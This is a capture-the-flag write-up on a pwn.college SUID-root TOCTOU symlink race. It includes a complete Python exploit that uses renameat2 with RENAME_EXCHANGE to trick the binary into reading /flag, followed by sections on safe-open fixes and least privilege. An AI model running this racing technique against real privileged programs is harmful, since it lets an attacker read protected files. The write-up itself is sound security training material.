# Stage 19: Race Conditions Level 1.1 — TOCTOU Atomic Exchange

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Race Condition |
| **Level** | 1.1 |
| **Estimated Time** | — |
| **Category** | Race Condition / TOCTOU |
| **Platform** | Linux x86-64 |
| **Binary** | `/challenge/babyrace_level1.1` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/babyrace_level1.1` is a SUID-root ELF binary that accepts a pathname, rejects paths containing `flag`, rejects symbolic links with `lstat()`, sleeps for 10 milliseconds, then opens the same pathname and prints up to 256 bytes.

The difference from Level 1.0 is that there are no interactive pauses. The race window is a fixed `usleep(10000)`, so the attacker cannot stop the program, swap the file, and continue. The filesystem has to be changed continuously while the program runs.

The exploit creates a regular file and a symlink to `/flag`, then uses `renameat2()` with `RENAME_EXCHANGE` to atomically swap the two directory entries in a separate process. The target's `lstat()` can observe the regular file while its later `open()` resolves the same pathname to the symlink.

| Attribute | Details |
|-----------|---------|
| Vulnerability | Time-of-check to time-of-use (TOCTOU) |
| Attack primitive | Symlink race condition |
| Race technique | Atomic directory-entry exchange |
| System call | `renameat2()` with `RENAME_EXCHANGE` |
| Privilege boundary | SUID root |
| Target file | `/flag` |
| Result | Successful protected-file read |

## Reconnaissance

Start with directory enumeration:

```bash
ls
cd /challenge
ls -la
```

The target is:

```text
babyrace_level1.1
```

Identify the binary:

```bash
file ./babyrace_level1.1
```

Output:

```text
setuid ELF 64-bit LSB pie executable,
x86-64, version 1 (SYSV),
dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2,
not stripped
```

Important observations:

- ELF 64-bit executable.
- x86-64 architecture.
- Position-independent executable (PIE).
- Dynamically linked.
- Not stripped.
- SUID execution enabled.

Verify the permissions:

```bash
ls -l ./babyrace_level1.1
```

Observed:

```text
-rwsr-xr-x 1 root root 17424 Jan 28 2025 babyrace_level1.1
```

The `s` in the owner execute position is the SUID bit. When a normal user runs this binary, the process receives the executable owner's effective UID — root in this challenge. A successful privileged file read can therefore expose data the invoking user cannot normally access.

### String analysis

List the binary's strings:

```bash
strings -a ./babyrace_level1.1
```

Filter for the parts that matter:

```bash
strings -a ./babyrace_level1.1 | grep -Ei \
'pause|error|symlink|file|race|flag|goodbye'
```

Relevant strings:

```text
flag
Error: path contains `flag`!
Error: failed to get file status!
Error: file is a symlink!
### Goodbye!
```

Those strings point to four checks:

1. The pathname is filtered for the substring `flag`.
2. File metadata is retrieved.
3. Symbolic links are rejected.
4. The program eventually exits normally.

There was no evidence of the interactive pause mechanism used in Level 1.0. That difference matters when designing the exploit.

## Static Reverse Engineering

The original challenge source was not captured for this run. The C snippets below are the behavior reconstructed from the disassembly, not a verbatim copy.

Disassemble the binary:

```bash
objdump -d -M intel ./babyrace_level1.1
```

A focused view of `main()`:

```bash
objdump -d -M intel ./babyrace_level1.1 \
| grep -A180 -B15 '<main>'
```

### Argument validation

The binary checks that an argument was provided. Without a pathname:

```bash
./babyrace_level1.1
```

It terminates with:

```text
Assertion `argc > 1' failed.
```

The target therefore requires a pathname argument.

### Path substring filtering

The relevant call is:

```asm
call strstr@plt
```

The binary searches the supplied pathname for the substring `flag`. If it finds the substring, execution terminates.

This is a string filter, not a complete filesystem security policy. The exploit uses:

```text
/home/hacker/race/racefile
```

That pathname does not contain `flag`. The symbolic link's destination is:

```text
/flag
```

That distinction is the point: the program checks the supplied pathname string, but the kernel resolves the symlink destination later during `open()`.

### File metadata validation

The binary calls:

```asm
call __lstat
```

Conceptually:

```c
lstat(path, &st);
```

It then checks the file type:

```c
if (S_ISLNK(st.st_mode)) {
    puts("Error: file is a symlink!");
    exit(1);
}
```

The relevant machine instructions include:

```asm
and eax, 0xf000
cmp eax, 0xa000
```

On Linux:

- `S_IFMT` is `0xf000`.
- `S_IFLNK` is `0xa000`.

The check rejects a symbolic link if the pathname resolves to one at the moment of the `lstat()` call.

### Race window

The disassembly contains:

```asm
mov edi, 0x2710
call usleep@plt
```

`0x2710` is `10000` in decimal, so:

```c
usleep(10000);
```

That is 10,000 microseconds, or 10 milliseconds. This is the exploitation window.

### File opening

After the delay, the program executes:

```asm
call open@plt
```

Conceptually:

```c
fd = open(path, O_RDONLY);
```

The important difference is that `open()` resolves the pathname again. It does not automatically reuse the filesystem object inspected by `lstat()`. If the directory entry changes between those two calls, `open()` can follow the replacement.

### Reading and output

The disassembly then shows calls to:

```asm
call read@plt
call write@plt
```

The effective behavior is:

```c title="read-and-print.c" keys="3,4,6"
char buffer[0x100];

int fd = open(path, O_RDONLY);
ssize_t n = read(fd, buffer, 0x100);

write(STDOUT_FILENO, buffer, n);
```

The binary reads up to 256 bytes from the opened file and writes the result to standard output.

## Vulnerability Analysis

### What is TOCTOU?

TOCTOU means Time-of-Check to Time-of-Use. It occurs when a program:

1. Checks a resource.
2. Allows that resource to change.
3. Uses the resource without ensuring it is still the one that was checked.

The vulnerability is especially important in privileged programs: the validation may inspect an attacker-controlled object, while the later operation runs with elevated privileges.

### Vulnerable operation sequence

The target's relevant behavior is:

```c title="level-1-1-race.c" keys="1,3,6,8"
lstat(path, &st);

if (S_ISLNK(st.st_mode))
    exit(1);

usleep(10000);

fd = open(path, O_RDONLY);
```

The fundamental problem is:

```text
lstat(path) != open(path)
```

These are separate pathname-resolution operations. The kernel does not guarantee that both refer to the same underlying filesystem object.

### Expected secure behavior

A secure implementation should ensure that the object being used is the same object that was validated:

```c title="open-then-check.c" keys="1,8,13"
int fd = open(path, O_RDONLY | O_NOFOLLOW);

if (fd < 0)
    return 1;

struct stat st;

if (fstat(fd, &st) != 0) {
    close(fd);
    return 1;
}

if (!S_ISREG(st.st_mode)) {
    close(fd);
    return 1;
}
```

This is an improvement because validation happens on the opened file descriptor instead of a pathname that can be replaced. A production implementation must also consider trusted directory handling, hard links, mount points, ownership, permissions, and other path-resolution constraints.

## Exploitation Strategy

### Why the Level 1.0 approach did not work

Level 1.0 provided interactive synchronization points. The exploit could start the program, wait for a prompt, continue execution, replace the file, and continue again.

Level 1.1 does not provide those prompts. It uses a fixed 10 ms sleep, so the exploit must manipulate the filesystem continuously instead of waiting for manual input.

### Filesystem layout

The exploit creates two entries inside:

```text
/home/hacker/race/
```

Initial state:

```text
race/
├── racefile     regular file
└── swapfile     symlink -> /flag
```

The target always receives:

```text
/home/hacker/race/racefile
```

The pathname never changes. Only the filesystem object associated with that pathname changes.

### Atomic exchange

The exploit uses:

```c title="rename-exchange.c" keys="1,6"
renameat2(
    AT_FDCWD,
    "/home/hacker/race/racefile",
    AT_FDCWD,
    "/home/hacker/race/swapfile",
    RENAME_EXCHANGE
);
```

`RENAME_EXCHANGE` atomically exchanges two existing directory entries. Unlike a normal sequence of:

```text
unlink()
symlink()
```

the exchange does not require a separate interval in which the target pathname is absent.

The entries alternate between two states:

```text
State A:

racefile -> regular file
swapfile -> symlink to /flag
```

and:

```text
State B:

racefile -> symlink to /flag
swapfile -> regular file
```

An independent process repeats the exchange.

### Desired race timeline

```text
Attacker process                 SUID target
----------------                 -----------

Create regular file
Create symlink to /flag

Start exchange loop              Start target

                                 lstat(racefile)
                                 Sees regular file

                                 Validation succeeds

Exchange directory entries

                                 usleep(10000)

Exchange directory entries
Exchange directory entries
Exchange directory entries

                                 open(racefile)
                                 Resolves to symlink

                                 Opens /flag

                                 read()
                                 write()

                                 Flag appears in output
```

The successful exchange can happen at any point inside the race window. The exploit does not need to predict the precise scheduling time. It repeatedly changes the directory entries, increasing the probability that the target sees different objects during validation and use.

## Solution

The script below starts an atomic-exchange worker, launches the SUID target repeatedly, and stops when the flag appears.

```python title="exploit11.py" keys="61,66,97,99,108,133"
#!/usr/bin/env python3

import os
import sys
import signal
import ctypes
import subprocess

BINARY = "/challenge/babyrace_level1.1"

DIRECTORY = "/home/hacker/race"

TARGET = DIRECTORY + "/racefile"
SWAP = DIRECTORY + "/swapfile"

AT_FDCWD = -100
RENAME_EXCHANGE = 2

os.makedirs(DIRECTORY, exist_ok=True)


def cleanup():
    for path in (TARGET, SWAP):
        try:
            os.unlink(path)
        except FileNotFoundError:
            pass


# Start with a clean filesystem layout.
cleanup()

# Create the regular file.
with open(TARGET, "w") as f:
    f.write("NORMAL_FILE\n")

# Create the symbolic link.
os.symlink("/flag", SWAP)


# Load libc.
libc = ctypes.CDLL("libc.so.6", use_errno=True)

renameat2 = libc.renameat2

renameat2.argtypes = [
    ctypes.c_int,
    ctypes.c_char_p,
    ctypes.c_int,
    ctypes.c_char_p,
    ctypes.c_uint
]

renameat2.restype = ctypes.c_int

target_b = TARGET.encode()
swap_b = SWAP.encode()


# Create the independent exchange process.
pid = os.fork()

if pid == 0:
    try:
        while True:
            result = renameat2(
                AT_FDCWD,
                target_b,
                AT_FDCWD,
                swap_b,
                RENAME_EXCHANGE
            )

            if result != 0:
                error = ctypes.get_errno()

                message = (
                    "renameat2 failed: "
                    + os.strerror(error)
                    + "\n"
                )

                os.write(2, message.encode())
                os._exit(1)

    except BaseException:
        os._exit(1)


print("[+] Atomic exchange racer started")
print("[+] Target:", TARGET)
print("[+] Symlink destination: /flag")
print("[+] Launching SUID binary repeatedly...")


try:
    for attempt in range(1, 2001):

        result = subprocess.run(
            [BINARY, TARGET],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=2
        )

        output = result.stdout

        if b"pwn.college{" in output:

            print(
                "\n[+] SUCCESS on attempt "
                + str(attempt)
                + "\n"
            )

            sys.stdout.write(
                output.decode(errors="replace")
            )

            break

        if attempt % 100 == 0:
            print("[*] Attempts:", attempt)

    else:
        print(
            "\n[-] No flag captured after 2000 attempts."
        )

finally:

    try:
        os.kill(pid, signal.SIGTERM)
    except ProcessLookupError:
        pass

    os.waitpid(pid, 0)

    cleanup()

    print("\n[+] Racer stopped")
```

### Run it

```bash
python3 /tmp/exploit11.py
```

### Observed result

The observed output was:

```text
[+] Atomic exchange racer started
[+] Target: /home/hacker/race/racefile
[+] Symlink destination: /flag
[+] Launching SUID binary repeatedly...

[+] SUCCESS on attempt 1

###
### Welcome to /challenge/babyrace_level1.1!
###

pwn.college{...}
### Goodbye!

[+] Racer stopped
```

This is the observed result from the challenge execution; the flag value is redacted on this page.

## Technical Breakdown of the PoC

### `os.fork()`

```python
pid = os.fork()
```

Creates a child process. The child becomes the filesystem-exchange worker while the parent launches the SUID executable. This separates the race operation from the target's execution.

### `ctypes.CDLL()`

```python
libc = ctypes.CDLL("libc.so.6", use_errno=True)
```

Loads the C library so Python can invoke the native `renameat2()` function. This avoids rebuilding the exchange from multiple non-atomic filesystem operations.

### `renameat2()`

```python
renameat2(
    AT_FDCWD,
    target_b,
    AT_FDCWD,
    swap_b,
    RENAME_EXCHANGE
)
```

Arguments:

| Argument | Meaning |
|----------|---------|
| `AT_FDCWD` | Resolve relative paths from the current working directory |
| `target_b` | First directory entry |
| `AT_FDCWD` | Second directory entry's directory reference |
| `swap_b` | Second directory entry |
| `RENAME_EXCHANGE` | Atomically exchange both entries |

Both paths are absolute, so their resolution does not depend on the current working directory.

### `subprocess.run()`

```python
result = subprocess.run(
    [BINARY, TARGET],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    timeout=2
)
```

Runs the SUID target repeatedly. The argument is passed as an array, not through a shell, so the pathname is not interpreted by a shell. The output is captured so the exploit can detect the flag.

### Flag detection

```python
if b"pwn.college{" in output:
```

The script checks for the challenge flag format and stops when it appears.

### Cleanup

The racer is terminated and both temporary entries are removed. This avoids leaving the symlink or regular-file exchange artifacts in the challenge directory.

## Why the Attack Was Successful on Attempt 1

The target has a 10 ms delay between metadata validation and file opening. The exchange process continuously performs atomic directory-entry swaps during that interval.

The target only needs one favorable scheduling sequence:

1. `lstat()` observes the regular file.
2. The program accepts the metadata.
3. The exchange worker changes the directory entries.
4. `open()` resolves the target pathname to the symlink.
5. The SUID process reads the protected file.

The successful execution demonstrates that this sequence occurred on the first launch. It does not establish that every execution will succeed on the first attempt. Race conditions are inherently timing-dependent.

## Important Linux Filesystem Concepts

### `stat()` versus `lstat()`

| Function | Symlink behavior |
|----------|------------------|
| `stat()` | Follows the symbolic link |
| `lstat()` | Inspects the symbolic link itself |
| `fstat()` | Inspects an already-open file descriptor |

The target uses `lstat()` to reject symbolic links. That check only describes the object at the time the call occurs.

### Pathnames versus file descriptors

A pathname is a name used to resolve a filesystem object. A file descriptor refers to an already-open object.

The target validates a pathname and later opens the pathname again. A safer design opens the file first and validates the resulting descriptor.

### Atomicity

An atomic filesystem operation appears as one indivisible namespace change to competing operations. `RENAME_EXCHANGE` is useful here because the attacker can alternate two existing entries without the intermediate missing-path state associated with a remove-and-create strategy.

Atomicity does not mean the target and attacker execute in a predictable order. It means the exchange itself is not exposed as two separate rename operations.

### SUID and effective credentials

The target is SUID root. The important privilege distinction is:

- Real UID: identifies the invoking user.
- Effective UID: determines the identity used for many permission checks.
- Saved set-user-ID: allows certain privilege transitions.

For a normal successful SUID-root execution, the effective UID becomes the executable owner's UID. The target's privileged `open()` therefore accesses the file under the elevated process credentials.

## Why Common Approaches Fail

### Reusing the Level 1.0 PTY exploit

The earlier exploit waited for:

```text
Paused (press enter to continue)
```

Level 1.1 does not display that prompt. The target finishes normally, so the script waits for data that will never arrive.

### Replacing the file only once

A one-time sequence:

```bash
rm racefile
ln -s /flag racefile
```

does not reliably win the race. It may cause `lstat()` to observe the symlink, in which case the binary rejects it.

### Using `strstr()` as a security boundary

The program checks whether the supplied pathname contains `flag`. That does not establish that the eventual filesystem object cannot refer to `/flag`. String filtering and filesystem-object validation solve different problems.

### Assuming the race is deterministic

The 10 ms delay creates a favorable window, but scheduling remains nondeterministic. The observed first-attempt success is a result of this execution, not a guarantee about future executions.

## How to Fix It

The correct fix is not to make the sleep shorter. The correct fix is to remove the check/use race.

### Open first, then validate

A safer pattern:

```c title="safe-open-1-1.c" keys="1,10,16"
int fd = open(path, O_RDONLY | O_NOFOLLOW);

if (fd < 0) {
    perror("open");
    return 1;
}

struct stat st;

if (fstat(fd, &st) != 0) {
    perror("fstat");
    close(fd);
    return 1;
}

if (!S_ISREG(st.st_mode)) {
    fprintf(stderr, "Not a regular file\n");
    close(fd);
    return 1;
}

/* Read from the validated file descriptor. */
```

`O_NOFOLLOW` prevents the final pathname component from being followed if it is a symbolic link. `fstat()` validates the object actually opened.

### Use directory-relative operations

For sensitive filesystem operations, use a trusted directory descriptor with `openat()` or `openat2()`. Linux `openat2()` provides resolution restrictions such as:

- `RESOLVE_NO_SYMLINKS`
- `RESOLVE_NO_MAGICLINKS`
- `RESOLVE_BENEATH`
- `RESOLVE_IN_ROOT`

The appropriate flags depend on the application's intended path semantics.

### Avoid unnecessary SUID privileges

Where possible:

- Remove SUID execution.
- Use a narrowly scoped helper.
- Drop privileges before handling untrusted paths.
- Apply least-privilege access controls.
- Avoid trusting user-controlled filesystem namespaces.

### Do not rely on sleeps

A delay does not make a check/use sequence safe. It can actually make exploitation easier by enlarging the time available for a competing process to modify shared state.

## Further Research

### Filesystem race conditions

- Symlink TOCTOU.
- Hard-link manipulation.
- Temporary-file races.
- Directory-entry replacement.
- Rename-based races.
- Permission-check/use races.
- Path traversal combined with race conditions.

### Linux system calls worth understanding

| System call | Purpose |
|-------------|---------|
| `open()` | Open a file |
| `openat()` | Open relative to a directory descriptor |
| `openat2()` | Open with advanced resolution restrictions |
| `stat()` | Retrieve file metadata |
| `lstat()` | Retrieve metadata without following the final symlink |
| `fstat()` | Retrieve metadata from an open descriptor |
| `rename()` | Rename a filesystem entry |
| `renameat2()` | Extended rename operation |
| `unlink()` | Remove a directory entry |
| `symlink()` | Create a symbolic link |
| `link()` | Create a hard link |
| `access()` | Check access permissions |

### Useful tools

```bash
file ./babyrace_level1.1
readelf -h -l -s ./babyrace_level1.1
objdump -d -M intel ./babyrace_level1.1
strings -a ./babyrace_level1.1
gdb ./babyrace_level1.1
strace ./babyrace_level1.1 /home/hacker/race/racefile
```

Additional tools worth learning:

- GDB with pwndbg or GEF.
- `checksec`.
- `ltrace`.
- `perf`.
- Linux man pages.
- AddressSanitizer and ThreadSanitizer for suitable test programs.
- `syzkaller` for kernel syscall fuzzing.

**SUID tracing caveat:** tools such as `strace` can suppress SUID privilege elevation. A traced process may therefore have different credentials from a normal execution. Do not use traced behavior alone to conclude that a SUID exploit cannot work.

## Level 1.0 vs Level 1.1

| Property | Level 1.0 | Level 1.1 |
|----------|-----------|-----------|
| Target | `babyrace_level1.0` | `babyrace_level1.1` |
| Vulnerability | TOCTOU | TOCTOU |
| Validation | `lstat()` | `lstat()` |
| Use | `open()` | `open()` |
| Race window | Interactive pauses and delay | 10 ms delay |
| Exploit strategy | PTY synchronization | Continuous atomic exchange |
| Main technique | `unlink()` + `symlink()` | `renameat2()` |
| Result | Protected-file read | Protected-file read |

Both challenges demonstrate the same fundamental security failure: a privileged program validates a pathname but does not ensure that the filesystem object remains unchanged before using it.

The difference is the exploitation strategy. Level 1.0 allowed controlled synchronization. Level 1.1 required a continuously running filesystem race.

## Final Result

| Field | Value |
|-------|-------|
| Challenge | pwn.college — Race Conditions Level 1.1 |
| Target | `babyrace_level1.1` |
| Exploit | Python PoC using `ctypes`, `os.fork()`, `renameat2()`, and `RENAME_EXCHANGE` |
| Vulnerability | SUID-root TOCTOU symlink race |
| Observed result | Successful on attempt 1 |

The exploit did not require memory corruption, return-address manipulation, shellcode, or control-flow hijacking. It exploited a filesystem consistency failure across two separate system calls.

The key lesson is that security validation must apply to the exact object being used — not merely to a pathname that may resolve to a different object later.
